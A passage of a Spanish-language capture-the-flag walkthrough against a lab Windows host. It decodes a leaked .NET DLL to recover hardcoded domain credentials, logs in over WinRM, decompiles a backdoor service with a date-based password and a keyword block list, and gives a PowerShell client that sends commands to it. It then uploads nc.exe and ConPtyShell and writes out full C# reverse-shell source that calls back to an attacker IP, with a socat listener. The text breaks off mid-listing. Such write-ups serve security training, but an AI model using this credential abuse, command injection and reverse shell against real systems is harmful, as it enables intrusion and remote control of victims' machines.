gJ2AgYAtgJ2AgYA9QJ8AAYABAN8AAYAHAMSAwYAKAN8AAYAWwM8AwYAdgM8AwYAjAM8Aw4AvgOjAwYA1AMSAwYA4QMSAw4ADwT5Aw4AMAQdBA4AQgT5Aw4ATQT5Aw4AaQQdBAAAAAABAAAAAAABAAEAAQAQABUAAAAFAAEAAQAJABAAJwAAAAUAAgAHAAEBAAAzAAAADQAKAAgAAQEAAEEAAAANABAACAABAQAATgAAAA0AFQAIAAEAEABiAAAABQAiAAgAAQCbAAoABgAFAS0ABgBBADEABgALATUABgAXATkABgAdAQoABgAnAQoABgAyAQoABgA6AQoABgZDATkAVoBLAS0AVoBVAS0AVoBjAS0AVoBuAS0AVoB1AS0ABgZDATkAVoB9ATEAVoCBATEAVoCGATEAVoCMATEABgZDATkAVoCVATUAVoCdATUAVoCkATUAVoCrATUAVoCxATUAVoC2ATUAVoC8ATUAVoDEATUAVoDJATUAVoDUATUAVoDeATUAVoDjATUAUCAAAAAAhhjFAA0AAQDUIAAAAADEAMsAFAADAAghAAAAAOYB1AAUAAMAGiEAAAAAxAHUABgAAwAAAAAAgACRINwAHQAEAAAAAACAAJEg7wAmAAgAKyEAAAAAhhjFABQACwA0IQAAAACWAPABeAALANwhAAAAAJYAGAJ8AAsA1CMAAAAAhhjFABQACwAAAAEAJQIAAAIAMQIAAAEAPQIAAAEARwIAAAIAUwIAAAMAXAIAAAQAZQIAAAEAawIAAAIAZQIAAAMAcAICAAkAMQDFAIEAOQDFABQACQDFABQAIQDbAoYAIQDoAoYAQQD7AoYASQALA4oAUQDFAJAACQDLABQAWQArA58AYQDFAKQAaQDFAKkAeQDFABQAIQDFAK8AgQDFAKQACQD7AoYAiQDsA6QAEQDUABQAKQDFABQAKQDyA8QAkQDFAKQAmQA9BBQAoQDFAMoAoQBbBNEAsQB2BNYAsQCCBNoAsQCMBNYACAAsADwACAAwAEEACAA0AEYACAA4AEsACAA8AFAACABEAFUACABIADwACABMAEEACABQAFoACABYAFUACABcADwACABgAEEACABkAEYACABoAEsACABsAFAACABwAF8ACAB0AGQACAB4AFoACAB8AGkACACAAG4ACACEAHMALgALAPkALgATAAIBAAFrADwAlgC2AN8AbgMAAQsA3AABAAABDQDvAAEABIAAAAAAAAAAAAAAAAAAAAAA1AIAAAQAAAAAAAAAAAAAAAEAcwAAAAAABAAAAAAAAAAAAAAAAQB8AAAAAAAEAAAAAAAAAAAAAAABAJcDAAAAAAAAADxNb2R1bGU+AHN0b3JlZC5kbGwATmV0d29ya0Nvbm5lY3Rpb24ATmV0UmVzb3VyY2UAUmVzb3VyY2VTY29wZQBSZXNvdXJjZVR5cGUAUmVzb3VyY2VEaXNwbGF5dHlwZQBTdG9yZWRQcm9jZWR1cmVzAG1zY29ybGliAFN5c3RlbQBPYmplY3QASURpc3Bvc2FibGUARW51bQBfbmV0d29ya05hbWUAU3lzdGVtLk5ldABOZXR3b3JrQ3JlZGVudGlhbAAuY3RvcgBGaW5hbGl6ZQBEaXNwb3NlAFdOZXRBZGRDb25uZWN0aW9uMgBXTmV0Q2FuY2VsQ29ubmVjdGlvbjIAU2NvcGUARGlzcGxheVR5cGUAVXNhZ2UATG9jYWxOYW1lAFJlbW90ZU5hbWUAQ29tbWVudABQcm92aWRlcgB2YWx1ZV9fAENvbm5lY3RlZABHbG9iYWxOZXR3b3JrAFJlbWVtYmVyZWQAUmVjZW50AENvbnRleHQAQW55AERpc2sAUHJpbnQAUmVzZXJ2ZWQAR2VuZXJpYwBEb21haW4AU2VydmVyAFNoYXJlAEZpbGUAR3JvdXAATmV0d29yawBSb290AFNoYXJlYWRtaW4ARGlyZWN0b3J5AFRyZWUATmRzY29udGFpbmVyAEJhY2t1cENsaWVudHMAU3lzdGVtLlRleHQAU3RyaW5nQnVpbGRlcgBHZW5lcmF0ZUhUTUwAbmV0d29ya05hbWUAY3JlZGVudGlhbHMAZGlzcG9zaW5nAG5ldFJlc291cmNlAHBhc3N3b3JkAHVzZXJuYW1lAGZsYWdzAG5hbWUAZm9yY2UAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAHN0b3JlZABnZXRfUGFzc3dvcmQAZ2V0X1VzZXJOYW1lAEludDMyAFRvU3RyaW5nAFN0cmluZwBDb25jYXQAU3lzdGVtLklPAElPRXhjZXB0aW9uAEdDAFN1cHByZXNzRmluYWxpemUAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAERsbEltcG9ydEF0dHJpYnV0ZQBtcHIuZGxsAFN0cnVjdExheW91dEF0dHJpYnV0ZQBMYXlvdXRLaW5kAFN5c3RlbS5EYXRhAE1pY3Jvc29mdC5TcWxTZXJ2ZXIuU2VydmVyAFNxbFByb2NlZHVyZUF0dHJpYnV0ZQBTdHJlYW1Xcml0ZXIAVGV4dFdyaXRlcgBXcml0ZQBBcHBlbmQAU3lzdGVtLkRhdGEuU3FsQ2xpZW50AFNxbENvbm5lY3Rpb24AU3lzdGVtLkRhdGEuQ29tbW9uAERiQ29ubmVjdGlvbgBPcGVuAFNxbENvbW1hbmQAU3FsRGF0YVJlYWRlcgBFeGVjdXRlUmVhZGVyAERiRGF0YVJlYWRlcgBnZXRfSGFzUm93cwBHZXRTdHJpbmcAUmVhZAAAAAAARUUAcgByAG8AcgAgAGMAbwBuAG4AZQBjAHQAaQBuAGcAIAB0AG8AIAByAGUAbQBvAHQAZQAgAHMAaABhAHIAZQA6ACAAABFUAEUASQBHAE4AVABPAE4AABlqAGEAeQAuAHQAZQBpAGcAbgB0AG8AbgAAKUQAMABuAHQATAAwAHMAZQBTAGsAMwBsADMAdABvAG4ASwAzAHkAIQAAG1wAXABXAEUAQgBcAEMAbABpAGUAbgB0AHMAADVcAFwAVwBFAEIAXABDAGwAaQBlAG4AdABzAFwAYwBsAGkAZQBuAHQAcwAuAGgAdABtAGwAAIn3PAAhAEQATwBDAFQAWQBQAEUAIABIAFQATQBMACAAUABVAEIATABJAEMAIAAiAC0ALwAvAFcAMwBDAC8ALwBEAFQARAAgAEgAVABNAEwAIAA0AC4AMAAgAFQAcgBhAG4AcwBpAHQAaQBvAG4AYQBsAC8ALwBFAE4AIgA+AAoACgA8AGgAdABtAGwAPgAKADwAaABlAGEAZAA+AAoACQAKAAkAPABtAGUAdABhACAAaAB0AHQAcAAtAGUAcQB1AGkAdgA9ACIAYwBvAG4AdABlAG4AdAAtAHQAeQBwAGUAIgAgAGMAbwBuAHQAZQBuAHQAPQAiAHQAZQB4AHQALwBoAHQAbQBsADsAIABjAGgAYQByAHMAZQB0AD0AdQB0AGYALQA4ACIALwA+AAoACQA8AHQAaQB0AGwAZQA+ADwALwB0AGkAdABsAGUAPgAKAAkAPABtAGUAdABhACAAbgBhAG0AZQA9ACIAZwBlAG4AZQByAGEAdABvAHIAIgAgAGMAbwBuAHQAZQBuAHQAPQAiAEwAaQBiAHIAZQBPAGYAZgBpAGMAZQAgADYALgAwAC4ANwAuADMAIAAoAEwAaQBuAHUAeAApACIALwA+AAoACQA8AG0AZQB0AGEAIABuAGEAbQBlAD0AIgBjAHIAZQBhAHQAZQBkACIAIABjAG8AbgB0AGUAbgB0AD0AIgAwADAAOgAwADAAOgAwADAAIgAvAD4ACgAJADwAbQBlAHQAYQAgAG4AYQBtAGUAPQAiAGMAaABhAG4AZwBlAGQAYgB5ACIAIABjAG8AbgB0AGUAbgB0AD0AIgBDAG8AbgB0AGUAeAB0ACIALwA+AAoACQA8AG0AZQB0AGEAIABuAGEAbQBlAD0AIgBjAGgAYQBuAGcAZQBkACIAIABjAG8AbgB0AGUAbgB0AD0AIgAyADAAMgAwAC0AMAAxAC0AMQA2AFQAMQAyADoANQA3ADoANAA0ACIALwA+AAoACQA8AG0AZQB0AGEAIABuAGEAbQBlAD0AIgBBAHAAcABWAGUAcgBzAGkAbwBuACIAIABjAG8AbgB0AGUAbgB0AD0AIgAxADYALgAwADMAMAAwACIALwA+AAoACQA8AG0AZQB0AGEAIABuAGEAbQBlAD0AIgBEAG8AYwBTAGUAYwB1AHIAaQB0AHkAIgAgAGMAbwBuAHQAZQBuAHQAPQAiADAAIgAvAD4ACgAJADwAbQBlAHQAYQAgAG4AYQBtAGUAPQAiAEgAeQBwAGUAcgBsAGkAbgBrAHMAQwBoAGEAbgBnAGUAZAAiACAAYwBvAG4AdABlAG4AdAA9ACIAZgBhAGwAcwBlACIALwA+AAoACQA8AG0AZQB0AGEAIABuAGEAbQBlAD0AIgBMAGkAbgBrAHMAVQBwAFQAbwBEAGEAdABlACIAIABjAG8AbgB0AGUAbgB0AD0AIgBmAGEAbABzAGUAIgAvAD4ACgAJADwAbQBlAHQAYQAgAG4AYQBtAGUAPQAiAFMAYwBhAGwAZQBDAHIAbwBwACIAIABjAG8AbgB0AGUAbgB0AD0AIgBmAGEAbABzAGUAIgAvAD4ACgAJADwAbQBlAHQAYQAgAG4AYQBtAGUAPQAiAFMAaABhAHIAZQBEAG8AYwAiACAAYwBvAG4AdABlAG4AdAA9ACIAZgBhAGwAcwBlACIALwA+AAoACQAKAAkAPABzAHQAeQBsAGUAIAB0AHkAcABlAD0AIgB0AGUAeAB0AC8AYwBzAHMAIgA+AAoACQAJAGIAbwBkAHkALABkAGkAdgAsAHQAYQBiAGwAZQAsAHQAaABlAGEAZAAsAHQAYgBvAGQAeQAsAHQAZgBvAG8AdAAsAHQAcgAsAHQAaAAsAHQAZAAsAHAAIAB7ACAAZgBvAG4AdAAtAGYAYQBtAGkAbAB5ADoAIgBBAHIAaQBhAGwAIgA7ACAAZgBvAG4AdAAtAHMAaQB6AGUAOgB4AC0AcwBtAGEAbABsACAAfQAKAAkACQBhAC4AYwBvAG0AbQBlAG4AdAAtAGkAbgBkAGkAYwBhAHQAbwByADoAaABvAHYAZQByACAAKwAgAGMAbwBtAG0AZQBuAHQAIAB7ACAAYgBhAGMAawBnAHIAbwB1AG4AZAA6ACMAZgBmAGQAOwAgAHAAbwBzAGkAdABpAG8AbgA6AGEAYgBzAG8AbAB1AHQAZQA7ACAAZABpAHMAcABsAGEAeQA6AGIAbABvAGMAawA7ACAAYgBvAHIAZABlAHIAOgAxAHAAeAAgAHMAbwBsAGkAZAAgAGIAbABhAGMAawA7ACAAcABhAGQAZABpAG4AZwA6ADAALgA1AGUAbQA7ACAAIAB9ACAACgAJAAkAYQAuAGMAbwBtAG0AZQBuAHQALQBpAG4AZABpAGMAYQB0AG8AcgAgAHsAIABiAGEAYwBrAGcAcgBvAHUAbgBkADoAcgBlAGQAOwAgAGQAaQBzAHAAbABhAHkAOgBpAG4AbABpAG4AZQAtAGIAbABvAGMAawA7ACAAYgBvAHIAZABlAHIAOgAxAHAAeAAgAHMAbwBsAGkAZAAgAGIAbABhAGMAawA7ACAAdwBpAGQAdABoADoAMAAuADUAZQBtADsAIABoAGUAaQBnAGgAdAA6ADAALgA1AGUAbQA7ACAAIAB9ACAACgAJAAkAYwBvAG0AbQBlAG4AdAAgAHsAIABkAGkAcwBwAGwAYQB5ADoAbgBvAG4AZQA7ACAAIAB9ACAACgAJADwALwBzAHQAeQBsAGUAPgAKAAkACgA8AC8AaABlAGEAZAA+AAoACgA8AGIAbwBkAHkAPgAKADwAdABhAGIAbABlACAAYwBlAGwAbABzAHAAYQBjAGkAbgBnAD0AIgAwACIAIABiAG8AcgBkAGUAcgA9ACIAMAAiAD4ACgAJADwAYwBvAGwAZwByAG8AdQBwACAAdwBpAGQAdABoAD0AIgAxADgAMAAiAD4APAAvAGMAbwBsAGcAcgBvAHUAcAA+AAoACQA8AGMAbwBsAGcAcgBvAHUAcAAgAHcAaQBkAHQAaAA9ACIAMgAyADMAIgA+ADwALwBjAG8AbABnAHIAbwB1AHAAPgAKAAkAPABjAG8AbABnAHIAbwB1AHAAIAB3AGkAZAB0AGgAPQAiADIAMAA3ACIAPgA8AC8AYwBvAGwAZwByAG8AdQBwAD4ACgAJADwAYwBvAGwAZwByAG8AdQBwACAAdwBpAGQAdABoAD0AIgA2ADQAMgAiAD4APAAvAGMAbwBsAGcAcgBvAHUAcAA+AAoACQA8AGMAbwBsAGcAcgBvAHUAcAAgAHcAaQBkAHQAaAA9ACIAOQA2ACIAPgA8AC8AYwBvAGwAZwByAG8AdQBwAD4ACgAJADwAdAByAD4AATk8AC8AdABhAGIAbABlAD4ACgA8AC8AYgBvAGQAeQA+AAoACgA8AC8AaAB0AG0AbAA+AAoACQAJAAAJTgBhAG0AZQAAD0MAbwBtAHAAYQBuAHkAAAtFAG0AYQBpAGwAABdDAGEAcgBkACAATgB1AG0AYgBlAHIAABlTAGUAYwB1AHIAaQB0AHkAQwBvAGQAZQAACTwAdAByAD4AAF08AHQAZAAgAGgAZQBpAGcAaAB0AD0AIgAxADcAIgAgAGEAbABpAGcAbgA9ACIAbABlAGYAdAAiACAAdgBhAGwAaQBnAG4APQBiAG8AdAB0AG8AbQA+ADwAYgA+AAATPAAvAGIAPgA8AC8AdABkAD4AAAs8AC8AdAByAD4AAC9jAG8AbgB0AGUAeAB0ACAAYwBvAG4AbgBlAGMAdABpAG8AbgA9AHQAcgB1AGUAADVzAGUAbABlAGMAdAAgACoAIABmAHIAbwBtACAAYwBhAHIAZABfAGQAZQB0AGEAaQBsAHMAAFc8AHQAZAAgAGgAZQBpAGcAaAB0AD0AIgAxADcAIgAgAGEAbABpAGcAbgA9ACIAbABlAGYAdAAiACAAdgBhAGwAaQBnAG4APQBiAG8AdAB0AG8AbQA+AAALPAAvAHQAZAA+AABZrlvbO4TITrsIqJypk/eoAAi3elxWGTTgiQIGDgYgAgEOEhEDIAABBCABAQIIAAQIEgwODggGAAMIDggCAwYREAMGERQDBhEYAgYIBAEAAAAEAgAAAAQDAAAABAQAAAAEBQAAAAQAAAAABAgAAAAEBgAAAAQHAAAABAkAAAAECgAAAAQLAAAAAwAAAQQAABIVBCABAQgDIAAOBQACDg4OBSACAQ4ICAcEEgwIEgwCBAABARwEIAEBDgUgAQEROQYgAwEODg4NBwgODg4SEQ4SQRIIAgUgARIVDgYgAgEOEkkEIAASVQMgAAIEIAEOCBkHDg4OHQ4SFQ4SSRJRElUdDhIVHQ4dDggCCAEACAAAAAAAHgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9uVGhyb3dzAQAAAHg7AAAAAAAAAAAAAI47AAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAOwAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABAAAAAYAACAAAAAAAAAAAAAAAAAAAABAAEAAAAwAACAAAAAAAAAAAAAAAAAAAABAAAAAABIAAAAWEAAAEQCAAAAAAAAAAAAAEQCNAAAAFYAUwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAQAAAACAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsASkAQAAAQBTAHQAcgBpAG4AZwBGAGkAbABlAEkAbgBmAG8AAACAAQAAAQAwADAAMAAwADAANABiADAAAAAsAAIAAQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAAIAAAADAACAABAEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMAAuADAALgAwAC4AMAAAADgACwABAEkAbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAAcwB0AG8AcgBlAGQALgBkAGwAbAAAAAAAKAACAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAIAAAAEAACwABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABzAHQAbwByAGUAZAAuAGQAbABsAAAAAAA0AAgAAQBQAHIAbwBkAHUAYwB0AFYAZQByAHMAaQBvAG4AAAAwAC4AMAAuADAALgAwAAAAOAAIAAEAQQBzAHMAZQBtAGIAbAB5ACAAVgBlAHIAcwBpAG8AbgAAADAALgAwAC4AMAAuADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAMAAAAoDsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
```

Ahora todo este `output` codificado en `Base64` lo copiaremos y ejecutaremos lo siguiente en nuestro `kali`.

```shell
# Pega el Base64 en un archivo (todo en una línea)
echo "PEGAR_BASE64_AQUI" > clientsbackup.b64

# Decodificar Base64 a binario
base64 -d clientsbackup.b64 > clientsbackup.dll

# Verificamos
file clientsbackup.dll
```

Info:

```
clientsbackup.dll: PE32 executable for MS Windows 4.00 (DLL), Intel i386 Mono/.Net assembly, 3 sections
```

Veremos que ha funcionado de forma correcta, por lo que vamos a explorarlo en busca de posibles credenciales, usuarios, informacion sensible, etc...

Primero vamos a volcar el codigo decompilado en un archivo.

```shell
monodis --output=clientsbackup.il clientsbackup.dll
```

Ahora vamos a explorar dicho archivo decompilado, para ver que pasa por dentro.

```shell
grep "ldstr" clientsbackup.il
```

Info:

```
IL_005e:  ldstr "Error connecting to remote share: "
	IL_0001:  ldstr "TEIGNTON"
	IL_0007:  ldstr "jay.teignton"
	IL_000d:  ldstr "D0ntL0seSk3l3tonK3y!"
	IL_001c:  ldstr "\\\\WEB\\Clients"
	 IL_002a:  ldstr "\\\\WEB\\Clients\\clients.html"
.............................<RESTO_DE_DODIGO>.....................................
```

Ya de primeras estamos viendo unas credenciales del usuario `jay.teignton`, vamos a probar donde pueden servir dichas credenciales.

```shell
netexec winrm <IP> -u jay.teignton -p 'D0ntL0seSk3l3tonK3y!'
```

Info:

```
WINRM       10.13.37.12     5985   WEB              [*] Windows 10 / Server 2019 Build 17763 (name:WEB) (domain:TEIGNTON.HTB)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.13.37.12     5985   WEB              [+] TEIGNTON.HTB\jay.teignton:D0ntL0seSk3l3tonK3y! (Pwn3d!)
```

Veremos que funciona por `WinRM` por lo que vamos a conectarnos de esta forma:

```shell
evil-winrm -i <IP> -u jay.teignton -p 'D0ntL0seSk3l3tonK3y!'
```

Info:

```
Evil-WinRM shell v3.9

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jay.teignton\Documents> whoami
teignton\jay.teignton
```

Veremos que ha funcionado, si investigamos nuestros privilegios veremos que somos `Administradores locales` en cierta forma.

Si listamos `Documents` en la carpeta en la que entramos por defecto veremos lo siguiente:

```
Directory: C:\Users\jay.teignton\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/7/2020  10:31 PM          11264 WindowsService.exe
```

Vemos un archivo `WindowsService.exe` bastante interesante el cual vamos analizar por si acaso, vamos a descargarnos el archivo con la funcion propia de `wvil-winrm`.

```powershell
download WindowsService.exe
```

Info:

```
Info: Downloading C:\Users\jay.teignton\Documents\WindowsService.exe to WindowsService.exe

Info: Download successful!
```

Ahora si nos vamos donde esta el archivo veremos que esta en `kali` de forma correcta, por lo que vamos analizar con `strings` dicho binario.

```shell
strings WindowsService.exe
```

Info:

```
...........................<RESTO_DE_INFO>.........................................
CONTEXT{l0l_s0c3ts_4re_fun}
...........................<RESTO_DE_INFO>.........................................
```

Entre toda esta informacion veremos la `flag` directamente.

> It's not a backdoor, it's a feature (Flag)

```
CONTEXT{l0l_s0c3ts_4re_fun}
```

## Key to the castle

Si seguimos analizando la informacion del `string` veremos lo siguiente:

1. **GUID del servicio:** `$46c273c4-b625-4cae-bba3-79fb0d3406bc`
2. **Hash/ID:** `A33F15B33A1F5B6771562D59344B8A68A26F437251363595E3E67AE637B16230`
3. **Es un servicio .NET 4.7.2**
4. **Path del PDB:** `C:\Users\Josiah\Downloads\windows-service\...`
5. **Funciones del servicio:** `CreateClientProcess`, `CheckClientPassword`, `Bind`, `Listen`

Vamos a irnos a un `Windows` para descargarnos la herramienta llamada `dnSpy.exe` que nos lo descargaremos en la siguiente `URL` la de `64 Bits` en mi caso.

URL = [dnSpy GitHub Herramienta](https://github.com/dnSpy/dnSpy/releases)

Una vez que nos lo descargaremos lo ejecutaremos con normalidad y abriremos dentro del programa el archivo de `WindowsService.exe` para verlo decompilado, buscando un poco en sus funciones y parametros, veremos en uno de ellos algo interesante que sera el `flujo` de `autenticacion`.

<figure><img src="../../.gitbook/assets/Pasted image 20260105132717.png" alt=""><figcaption></figcaption></figure>

Si analizamos dicho codigo veremos el siguiente fragmento de codigo:

> Flujo de autenticacion:

```
1. Cliente se conecta a 127.0.0.1:7734
2. Primer mensaje: Debe contener "password=FECHA_ACTUAL-thisisleet"
3. Si es correcto: responde "OK\n"
4. Segundo mensaje: Debe contener "command=COMANDO_A_EJECUTAR"
5. Si pasa validación: ejecuta el comando y envía la flag
```

```c
# Funcion de inicio del proceso
public void Start()
		{
			this.IP = IPAddress.Loopback;
			this.Endpoint = new IPEndPoint(this.IP, 7734);
			try
			{
				this.Listener = new Socket(this.IP.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
				this.Listener.Bind(this.Endpoint);
				this.Listener.Listen(25);
				for (;;)
				{
					Socket handler = this.Listener.Accept();
					new Thread(delegate()
					{
						try
						{
							string data = this.GetClientMessage(handler).Trim();
							if (this.CheckClientPassword(handler, data))
							{
								data = this.GetClientMessage(handler).Trim();
								this.CheckClientCommand(handler, data);
							}
						}
						finally
						{
							handler.Shutdown(SocketShutdown.Both);
							handler.Close();
						}
					}).Start();
				}
			}
			catch (Exception)
			{
			}
			finally
			{
				this.Listener.Shutdown(SocketShutdown.Both);
			}
		}

# Contraseña dinamica
private static string Password()
{
    return DateTime.Now.ToString("yyyy-MM-dd") + "-thisisleet";
}

# Checkeo de contraseña
private bool CheckClientPassword(Socket handler, string data)
		{
			string[] array = data.Split(new string[]
			{
				"password="
			}, StringSplitOptions.None);
			if (array.Length != 2 || array[1] == null)
			{
				handler.Send(this.ErrorMessage);
				return false;
			}
			if (array[1] != TCPServer.Password())
			{
				handler.Send(this.ErrorMessage);
				return false;
			}
			handler.Send(this.SuccessMessage);
			return true;
		}

# Checkeo para ejecutar comandos
private bool CheckClientCommand(Socket handler, string data)
		{
			string[] array = data.Split(new string[]
			{
				"command="
			}, StringSplitOptions.None);
			if (array.Length != 2 || array[1] == null)
			{
				handler.Send(this.ErrorMessage);
				return false;
			}
			string text = array[1];
			foreach (string value in new string[]
			{
				" ",
				"Windows",
				"System32",
				"PowerShell"
			})
			{
				if (text.Contains(value))
				{
					handler.Send(this.ErrorMessage);
					return false;
				}
			}
			this.CreateClientProcess(text);
			handler.Send(this.Flag);
			return true;
		}
```

Vemos aqui que es una contraseña `dinamica`, la contraseña cambia diariamente: `AAAA-MM-DD-thisisleet` (Ejemplo - hoy (2026-01-03): `2026-01-03-thisisleet`)

Bloquea comandos que contengan:

* `" "` (espacios)
* `"Windows"`
* `"System32"`
* `"PowerShell"`

> Payload para probar

```powershell
$port = 7734
$today = Get-Date -Format "yyyy-MM-dd"
$password = "$today-thisisleet"
$command = "whoami"

$client = New-Object System.Net.Sockets.TcpClient('127.0.0.1', $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)

$writer.WriteLine("password=$password")
$writer.Flush()
Start-Sleep -Milliseconds 300

$response1 = $reader.ReadLine()
Write-Host "Respuesta password: $response1"

if ($response1 -eq "OK") {

    $writer.WriteLine("command=$command")
    $writer.Flush()
    Start-Sleep -Milliseconds 300

    $response2 = $reader.ReadToEnd()
    Write-Host "Respuesta comando: $response2"
}

$client.Close()
```

Si enviamos el `payload` anterior para probar que funciona, veremos lo siguiente:

```
Respuesta password: OK
Respuesta comando: CONTEXT{l0l_s0c3ts_4re_fun}
```

Veremos que esta funcionando por lo que vimos, ahora vamos a probar a obtener una `reverse shell` utilizando `nc.exe`, por lo que vamos a pasarnos el `nc.exe` de `kali` a la maquina victima:

```shell
cp /usr/share/windows-resources/binaries/nc.exe .
```

Ahora desde la maquina victima lo subimos con las funcionalidades de `evil-winrm`...

```powershell
mkdir C:\Temp
cd C:\Temp
upload nc.exe
dir
```

Info:

```
Directory: C:\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         1/5/2026   1:48 PM          59392 nc.exe
```

Veremos que ya estara subido el archivo, por lo que vamos a mejorar la `shell` tambien para que nos permita `output` desde la propia `shell` y comunicarnos con el servicio de forma mas comoda y no con tanto script, utilizaremos una herramienta llamada `ConPtyShell`.

URL = [ConPtyShell ZIP Windows Download GitHub](https://github.com/antonioCoco/ConPtyShell/releases/download/1.5/ConPtyShell.zip)

Una vez que nos lo hayamos descargado, lo descomprimiremos desde el `kali` de esta forma:

```shell
unzip ConPtyShell.zip
```

Esto nos dara el archivo `ConPtyShell.exe`, el cual nos pasaremos a la maquina victima con el `upload` de `evil-winrm` como con el anterior archivo.

```powershell
upload ConPtyShell.exe
```

Ahora vamos a ejecutar el binario de esta forma, pero antes nos pondremos a la escucha con `socat` para tener una mejor conexion y compilaremos una `reverse shell` en un binario.

```powershell
# Crear shell.exe con PowerShell embebido
$code = @'
using System;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;

namespace ReverseShell
{
    class Program
    {
        static void Main(string[] args)
        {
            string ip = "<IP_ATTACKER>";
            int port = <PORT>;
            
            try
            {
                using (TcpClient client = new TcpClient(ip, port))
                using (NetworkStream stream = client.GetStream())
                {
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    
                    while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        string command = Encoding.ASCII.GetString(buffer, 0, bytesRead);
                        
                        if (command.ToLower().Trim() == "exit") break;
                        
                        Process process = new Process();
                        process.StartInfo.FileName = "cmd.exe";
                        process.StartInfo.Arguments = "/c " + command;
                        process.StartInfo.UseShellExecute = false;
                        process.StartInfo.RedirectStandardOutput = true;
                        process.StartInfo.RedirectStandardError = true;
                        process.StartInfo.CreateNoWindow = true;
                        
                        process.Start();
                        
                        string output = process.StandardOutput.ReadToEnd();
                        string error = process.StandardError.ReadToEnd();
                        process.WaitForExit();
                        
                        string result = output + error;
                        byte[] resultBytes = Encoding.ASCII.GetBytes(result);
                        stream.Write(resultBytes, 0, resultBytes.Length);
                    }
                }
            }
            catch (Exception) { }
        }
    }
}
'@

# Compilar el código
Add-Type -TypeDefinition $code -Language CSharp -OutputAssembly "shell.exe" -OutputType ConsoleApplication -ReferencedAssemblies "System"
```

Nos ponemos a la escucha:

```shell
socat file:`tty`,raw,echo=0 TCP-L:<PORT>
```

Una vez estando a la escucha, lo ejecutaremos asi:

```powershell
.\ConPtyShell.exe <IP_ATTACKER> <PORT>
```

Si volvemos donde tenemos la escucha y listamos con `dir` veremos lo siguiente:

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Temp> dir


    Directory: C:\Temp


Mode                LastWriteTime         Length Name
